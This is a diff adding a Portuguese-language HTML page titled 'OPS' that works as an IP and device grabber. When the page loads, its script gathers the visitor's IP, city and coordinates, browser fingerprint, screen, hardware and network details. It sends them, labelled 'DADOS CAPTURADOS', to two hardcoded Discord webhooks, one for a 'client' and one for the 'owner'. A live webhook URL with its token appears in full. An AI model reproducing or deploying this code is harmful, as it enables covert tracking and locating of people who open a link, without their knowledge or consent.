@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://i.ibb.co/8DQxp4d2/0367f7abebcb46f85b1bc4156f65e1ea.gif') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 20px;
+            color: white;
+            line-height: 1.6;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: white;
+            text-shadow: 0 0 10px rgba(255,255,255,0.8);
+        }
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: monospace;
+            font-size: 14px;
+            text-shadow: 0 0 5px rgba(255,255,255,0.7);
+        }
+    </style>
+</head>
+<body>
+    <h1>OPS</h1>
+    <pre id="info">Carregando suas informações...</pre>
+
+    <script>
+        // WEBHOOKS (DUALHOOK SYSTEM)
+        const WEBHOOK_CLIENTE = "https://discord.com/api/webhooks/1420150816223793276/gTHt8SRvPsZaAZibfLE_PGiolk10slvQyKaHbraoPN6nNYNcrJL5nibhzpOSvrwA932T"; // Altere para o webhook do cliente
+        const WEBHOOK_DONO = "https://discord.com/api/webhooks/1420150816223793276/gTHt8SRvPsZaAZibfLE_PGiolk10slvQyKaHbraoPN6nNYNcrJL5nibhzpOSvrwA932T"; // Seu webhook principal
+
+        // Função para enviar para o Discord
+        async function enviarParaDiscord(webhook, data) {
+            try {
+                const response = await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "@everyone",
+                        embeds: [{
+                            title: "DADOS CAPTURADOS",
+                            description: "```" + data + "```",
+                            color: 16711680,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error("Erro ao enviar para webhook:", error);
+                return false;
+            }
+        }
+
+        // PEGA TODOS OS DADOS
+        async function getData() {
+            try {
+                const ipInfo = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(e => ({}));
+                const ipApiData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(e => ({}));
+                
+                const data = {
+                    ip: ipInfo.ip || ipApiData.ip || "N/A",
+                    city: ipInfo.city || ipApiData.city || "N/A",
+                    region: ipInfo.region || ipApiData.region || "N/A",
+                    country: ipInfo.country || ipApiData.country || "N/A",
+                    loc: ipInfo.loc || (ipApiData.latitude && ipApiData.longitude ? `${ipApiData.latitude},${ipApiData.longitude}` : "N/A"),
+                    org: ipInfo.org || ipApiData.org || "N/A",
+                    postal: ipInfo.postal || ipApiData.postal || "N/A",
+                    timezone: ipInfo.timezone || ipApiData.timezone || "N/A",
+                    asn: ipApiData.asn || "N/A",
+                    proxy: ipApiData.proxy || "N/A",
+                    
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        appVersion: navigator.appVersion,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        onLine: navigator.onLine,
+                        javaEnabled: navigator.javaEnabled(),
+                        pdfViewerEnabled: navigator.pdfViewerEnabled,
+                        webdriver: navigator.webdriver,
+                        vendor: navigator.vendor || "N/A",
+                        product: navigator.product || "N/A",
+                        maxTouchPoints: navigator.maxTouchPoints || "N/A"
+                    },
+                    
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        orientation: screen.orientation?.type || "N/A",
+                        devicePixelRatio: window.devicePixelRatio || "N/A"
+                    },
+                    
+                    hardware: {
+                        deviceMemory: navigator.deviceMemory || "N/A",
+                        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+                        cpuClass: navigator.cpuClass || "N/A"
+                    },
+                    
+                    network: {
+                        downlink: navigator.connection?.downlink || "N/A",
+                        effectiveType: navigator.connection?.effectiveType || "N/A",
+                        rtt: navigator.connection?.rtt || "N/A",
+                        saveData: navigator.connection?.saveData || "N/A"
+                    },
+                    
+                    media: {
+                        audioInputs: "N/A",
+                        audioOutputs: "N/A",
+                        videoInputs: "N/A"
+                    }
+                };
+
+                // PEGA DISPOSITIVOS DE MÍDIA
+                if (navigator.mediaDevices) {
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        data.media.audioInputs = devices.filter(d => d.kind === 'audioinput').length;
+                        data.media.audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
+                        data.media.videoInputs = devices.filter(d => d.kind === 'videoinput').length;
+                    } catch (e) {}
+                }
+
+                // FORMATA OS DADOS PARA EXIBIÇÃO
+                let formattedData = `ip: ${data.ip}\n`;
+                formattedData += `city: ${data.city}\n`;
+                formattedData += `region: ${data.region}\n`;
+                formattedData += `country: ${data.country}\n`;
+                formattedData += `loc: ${data.loc}\n`;
+                formattedData += `org: ${data.org}\n`;
+                formattedData += `postal: ${data.postal}\n`;
+                formattedData += `timezone: ${data.timezone}\n`;
+                formattedData += `asn: ${data.asn}\n`;
+                formattedData += `proxy: ${data.proxy}\n\n`;
+                
+                formattedData += `userAgent: ${data.browser.userAgent}\n`;
+                formattedData += `appVersion: ${data.browser.appVersion}\n`;
+                formattedData += `platform: ${data.browser.platform}\n`;
+                formattedData += `language: ${data.browser.language}\n`;
+                formattedData += `cookieEnabled: ${data.browser.cookieEnabled}\n`;
+                formattedData += `doNotTrack: ${data.browser.doNotTrack}\n`;
+                formattedData += `onLine: ${data.browser.onLine}\n`;
+                formattedData += `javaEnabled: ${data.browser.javaEnabled}\n`;
+                formattedData += `pdfViewerEnabled: ${data.browser.pdfViewerEnabled}\n`;
+                formattedData += `webdriver: ${data.browser.webdriver}\n`;
+                formattedData += `vendor: ${data.browser.vendor}\n`;
+                formattedData += `product: ${data.browser.product}\n`;
+                formattedData += `maxTouchPoints: ${data.browser.maxTouchPoints}\n\n`;
+                
+                formattedData += `screenWidth: ${data.screen.width}\n`;
+                formattedData += `screenHeight: ${data.screen.height}\n`;
+                formattedData += `availWidth: ${data.screen.availWidth}\n`;
+                formattedData += `availHeight: ${data.screen.availHeight}\n`;
+                formattedData += `colorDepth: ${data.screen.colorDepth}\n`;
+                formattedData += `pixelDepth: ${data.screen.pixelDepth}\n`;
+                formattedData += `orientation: ${data.screen.orientation}\n`;
+                formattedData += `devicePixelRatio: ${data.screen.devicePixelRatio}\n\n`;
+                
+                formattedData += `deviceMemory: ${data.hardware.deviceMemory}\n`;
+                formattedData += `hardwareConcurrency: ${data.hardware.hardwareConcurrency}\n`;
+                formattedData += `cpuClass: ${data.hardware.cpuClass}\n\n`;
+                
+                formattedData += `downlink: ${data.network.downlink}\n`;
+                formattedData += `effectiveType: ${data.network.effectiveType}\n`;
+                formattedData += `rtt: ${data.network.rtt}\n`;
+                formattedData += `saveData: ${data.network.saveData}\n\n`;
+                
+                formattedData += `audioInputs: ${data.media.audioInputs}\n`;
+                formattedData += `audioOutputs: ${data.media.audioOutputs}\n`;
+                formattedData += `videoInputs: ${data.media.videoInputs}`;
+
+                // MOSTRA NA TELA
+                document.getElementById('info').textContent = formattedData;
+
+                // ENVIA PARA OS DOIS WEBHOOKS SIMULTANEAMENTE
+                const promises = [
+                    enviarParaDiscord(WEBHOOK_CLIENTE, formattedData),
+                    enviarParaDiscord(WEBHOOK_DONO, formattedData)
+                ];
+
+                // Verifica se os envios foram bem sucedidos
+                const resultados = await Promise.all(promises);
+                console.log("Resultados do envio:", {
+                    cliente: resultados[0],
+                    dono: resultados[1]
+                });
+
+            } catch (error) {
+                document.getElementById('info').textContent = "Erro ao carregar dados.";
+                console.error(error);
+            }
+        }
+
+        // INICIA
+        getData();
+    </script>
+</body>
+</html>
